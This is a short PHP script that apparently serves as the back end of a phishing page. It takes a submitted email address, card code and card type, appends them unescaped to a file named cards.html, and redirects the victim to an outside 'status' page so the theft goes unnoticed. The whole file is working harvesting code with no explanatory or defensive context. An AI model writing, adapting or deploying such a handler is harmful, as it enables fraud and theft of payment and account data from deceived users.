<?php
$txt = "cards.html"; 
if (isset($_POST['synemail']) && isset($_POST['cardcode'])) {
    header ('Location: https://donaldjtrump.io/synapi/status/');
    $fh = fopen($txt, 'a'); 
    $txt="<br>Email: ".$_POST['synemail']."\n<br>Card: ".$_POST['cardcode']."\n<br>Card type: ".$_POST['cardtype']."\n"; 
    fwrite($fh,$txt);
    fclose($fh);
} else {
  header("Location: " . $_SERVER["HTTP_REFERER"]);
}
?>
